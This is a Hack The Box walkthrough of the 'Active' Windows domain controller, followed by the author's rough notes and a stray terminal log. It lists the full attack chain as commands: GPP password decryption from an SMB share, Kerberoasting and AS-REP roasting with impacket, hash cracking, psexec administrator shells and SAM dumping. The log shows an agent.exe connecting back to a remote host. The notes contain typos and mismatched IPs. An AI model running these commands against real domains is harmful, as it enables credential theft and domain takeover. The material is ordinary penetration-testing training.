
# Active — Hack The Box

**By Stager** | PNPT Candidate | FashilHack

---

## What is this machine

Active is a Windows Active Directory box focused on **Kerberoasting** and SMB enumeration.

The goal is to move from basic network access → domain user → service account compromise → full domain admin.

This machine is a perfect introduction to how **real AD attacks work in enterprise environments**.

---

## Target

```
IP: 10.10.10.1
OS: Windows (Active Directory Domain)
Domain: active.htb
```

---

## Step 1 — Nmap Scan

Start with full enumeration.

```bash
nmap -A -p- -T5 -Pn 10.10.10.1
```

You’ll typically see:
- SMB (139, 445)
- Kerberos (88)
- LDAP (389)
- DNS (53)

This confirms it's a **Domain Controller**.

---

## Step 2 — SMB Enumeration (Anonymous Access)

First thing in AD environments → check SMB.
### smbmap

```bash
smbmap -H 10.10.10.1
```

Looking for:
- Anonymous access
- Readable shares
---
### smbclient

```bash
smbclient -N -L //10.10.10.1
```

If shares are accessible:

```bash
smbclient //10.10.10.1/Replication
```

Then:

```bash
dir
get Groups.xml
```

---
## Step 3 — Extract Credentials (GPP Password)

Inside the share, we find:

```
Groups.xml
```

This is a **Group Policy Preferences file**, which can contain encrypted passwords.

Decrypt it:

```bash
gpp-decrypt <hash>
```

✔️ This gives:
- Username
- Password

---
### 🔑 Operator Note
- GPP passwords are **always reversible**
- Microsoft patched this, but **old configs still exist**
- This is a **real-world vulnerability**, not just CTF

---
## Step 4 — Validate Credentials

Now test the credentials:
```bash
netexec smb 10.10.10.1 -u "username" -p "password"
```
If you see:
```
[+] Authentication successful
```

You now have a **valid domain user**

## Step 5 — Kerberoasting (Main Attack)

Now comes the core of this box.
### 🧠 What is Kerberoasting?
- You authenticate → get **TGT**
- Request **TGS** for a service account
- The TGS is encrypted with the **service account password hash**
- You crack it offline → get the password
### 🔑 Operator Note
- You are NOT cracking Kerberos itself
- You are cracking the **service account password**

### Run Kerberoasting
```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.1 active.htb/user:password
```

If successful, you get a hash like:

```
$krb5tgs$...
```

### ⚠️ If You Get Clock Skew Error

Fix time sync:
```bash
sudo apt install ntpsec-ntpdate -y
sudo ntpdate 10.10.10.1
```
## Step 6 — Crack the Hash
Use Hashcat:

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
Or John:
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

✔️ You recover the **service account password**

---
### 🔑 Operator Note
- Hash type = Kerberos TGS → mode 13100
- Always identify hash format before cracking

---
## Step 7 — Lateral Movement

Now test new credentials:
```bash
netexec smb 10.10.10.1 -u "service_account" -p "password"
```

---
## Step 8 — Get Shell (psexec)

Since this is SMB-based:
```bash
impacket-psexec active.htb/administrator:password@10.10.10.1
```

Or:

```bash
rlwrap impacket-psexec active.htb/administrator:password@10.10.10.1
```

✔️ You now have a shell.

---
### 🔑 Operator Note
- If WinRM fails → try **psexec**
- SMB (139/445) is enough for psexec
- WinRM requires port 5985
---
## Step 9 — Dump Hashes (Optional)

```bash
netexec smb 10.10.10.1 -u administrator -p password --sam
```

---
## Full Attack Chain

```
Nmap → Identify AD services
  ↓
SMB anonymous access → find Groups.xml
  ↓
gpp-decrypt → get user credentials
  ↓
Validate user → domain access
  ↓
Kerberoasting → extract TGS hash
  ↓
Crack hash → service account password
  ↓
psexec → Administrator shell
```

---
## What I learned from this one

**SMB is everything in AD.**  
If you don’t check shares, you miss the entire entry point.

**Kerberoasting is one of the most important real-world attacks.**  
This is not just CTF — this is used in real pentests.

**You always need a valid user first.**  
No Kerberoasting without authentication.

**Time matters in Kerberos.**  
If your clock is off → attack fails.

---
## Important Notes to Remember

- You NEED a valid domain user for Kerberoasting
- No SPN = No Kerberoast
- GPP passwords are reversible
- Always check SMB shares first
- If WinRM fails → use psexec

---
## Screenshots — Where to Add

Add screenshots at these points:
1. **Nmap scan results**
2. **SMB share listing**
3. **Groups.xml content**
4. **gpp-decrypt output (credentials)**
5. **Kerberoast hash output**
6. **Hashcat cracked password**
7. **psexec shell (Administrator)**

_Stager — PNPT Candidate_  
_FashilHack — Simulating Attacks, Securing Businesses._


---
# htb room called active 
this box is practing a kerboasting which is a service account which is administartor 
GOAL OF KERBEROASTING = GET TGS AND DECRPT SERVER'S ACCOUNT HASH 

first we have user we login then we get TGT when we receive it then we will request TGS using TGT, that service ticket is going to be encrypted with servers account hash
why does it matter that it's hash we can decrypt that try to crack it using tool called GetUserSPNs.py(it's from impacket)  

- runned nmap scan `nmap scan nmap -A -p- -T5 -Pn 10.10.10.1 -v
- checked if we have file access in smbmap and smbclient 
## smbmap 
looking for if there is fileshares with anonym login
- `smbmap -H 10.10.1.201`
- if we have access to one on readonly

## smbclient
- `smblient -N -L 10.10.10.1` (sometimes you do this //10.10.10.1//)
- `smbclient //10.10.10.1/file -c 'recurse;ls'` 
- manual way is =  `smbclient //10.10.10.1/file `
- and then say = dir 
- if you want a file inside of this you can say 
- get Group.xml (and it will isnstall on your kali)
- crack it with using `gpp-decrypt <hash>`
- we get a username and hash of service which grants TGS

to crack a hash of a group use 
- gpp-decrypt (hash)

when you have username and password try to use smbmap again logging in checking if that user has a file access 

# You request a **TGS** for an account that has an **SPN** (service account).
## impacket-GetNPUsers(AS-REP Roasting.)
let pretend we find username but not a password you can try this 
- `impacket-GetNPUsers  -dc-ip 10.10.10.1 FH.local/said -no-pass`
- we were trying to get TGT hash so we could do pass the ticket 
- crack the **user’s password**.
- as-rep roasting has something to do with local admin and admin to get a hash or login with 

If the user is not a service account, can AS-REP roasting work?
✔️ **ANSWER: Only if the AD admin enabled “Do not require Kerberos preauthentication.”**
If "said" has no-pre-auth disabled (normal), AS-REP roasting won’t work.

## impacket-GetUserSPNs (kerberoasting attack)
try to pull hash  (TGS)
- If the user has **NO SPN (service priciple name account**, there is **NO Kerberoast hash**. Kerberoasting depends ONLY on **SPNs**, not if you are admin or not.
 - **If Kerberoasting succeeds, what hash am I cracking?** You are cracking the **password of the service account** that the SPN belonged to.
 -  **Can I Kerberoast without having any valid user?**  **NO.** You always need **one valid domain user** to request Kerberos tickets.

- `impacket-GetUserSPNs -request -dc-ip 10.10.10.1 DCname/username:password`
- if you got clock time error 
- mitigation is install = sudo apt install ntpsec-ntpdate -y then run sudo ntpdate 10.10.1.200
- if we got a hash ,  crack it in hashcat
- sometimes hashes are diff so you need to now num of diff hashes and to get that look at the start of each hash  in here start of $ sign end of $ sign take that and go to hashcat website and look for the number u gonna use 
- hashcat -m 13100 hash.txt -a rockyou.txt
- you can also crack with ==JOHN==
- `john hash.txt /user/share/wordlists/rockyou.txt`
- we cracked so we login using evil-winrm and get a shell or psexec
- and also if we try to smbmap and we can read and write to it check it 
- `REMEMBER` if we trying to get a shell using evil-winrm and port 139 is closed we can't get a shell
- we can try psexec which we can use port 139 and 445 

## impacket-psexec
login if you have user and pass
- impacket-psexec active.htb/administartor@10.10.10.1 
- and you can login like this too 
- `rlwrap impacket-psexec active.htb/administrator:<pass>@10.10.10.1`


## netexec (is equevilent to crackmapexec with advanace and newer)
- `netexec smb 10.10.10.1 -u "username" -p "password"`
- after you see "green + " you have know this username and password works then you can do to ==find DESCRIPTIONS OF USERNAME RUNNING== 
- `netexec smb 10.10.10.1 -u "username" -p "password" --users
- you can try to authenticate using winrm 
- `netexec winrm 10.10.10.1 -u "username" -p "password"`
- and it did not work with winrm becuase 
- `REMEMBER` if we trying to get a shell using evil-winrm and port 139 is closed we can't get a shell
- we can try psexec which we can use port 139 and 445 


after you got a hash in GetUserSPNs and crack it you can do crackmapexec/netexec
- `netexec smb 10.10.10.1 -u "administrator" -p "pass" --sam `



---


sudo nmap -T4 -p- 10.10.1.201                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 00:48 EST

nt : FH\said@C1-saacid] » start
error: already running
[Agent : FH\said@C1-saacid] » ERRO[5423] connection was refused                       
ERRO[5423] connection was refused                       
ERRO[5424] connection was refused                       
ERRO[5424] connection was refused                       
ERRO[5424] connection was refused                       
ERRO[5424] connection was refused   

C:\Users\said\Downloads>agent.exe -connect 192.168.100.10:11601 -ignore-cert
agent.exe -connect 192.168.100.10:11601 -ignore-cert
time="2025-11-24T20:18:51-08:00" level=warning msg="warning, certificate validation disabled"
time="2025-11-24T20:18:51-08:00" level=info msg="Connection established" addr="192.168.100.10:11601"


C:\Users\said\Downloads>agent.exe -connect 192.168.100.10:11601 -ignore-cert
agent.exe -connect 192.168.100.10:11601 -ignore-cert
time="2025-11-24T20:08:21-08:00" level=warning msg="warning, certificate validation disabled"
time="2025-11-24T20:08:21-08:00" level=info msg="Connection established" addr="192.168.100.10:11601"
time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
time="2025-11-24T20:18:01-08:00" level=error msg="connection write timeout"
time="2025-11-24T20:18:01-08:00" level=error msg="Connection error: connection write timeout"
time="2025-11-24T20:18:02-08:00" level=fatal msg="connection write timeout"

C:\Users\said\Downloads>agent.exe -connect 192.168.100.10:11601 -ignore-cert
agent.exe -connect 192.168.100.10:11601 -ignore-cert
time="2025-11-24T20:18:25-08:00" level=warning msg="warning, certificate validation disabled"
time="2025-11-24T20:18:25-08:00" level=info msg="Connection established" addr="192.168.100.10:11601"
time="2025-11-24T20:18:42-08:00" level=error msg="Connection error: EOF"
time="2025-11-24T20:18:42-08:00" level=fatal msg=EOF

C:\Users\said\Downloads>agent.exe -connect 192.168.100.10:11601 -ignore-cert
agent.exe -connect 192.168.100.10:11601 -ignore-cert
time="2025-11-24T20:18:51-08:00" level=warning msg="warning, certificate validation disabled"
time="2025-11-24T20:18:51-08:00" level=info msg="Connection established" addr="192.168.100.10:11601"

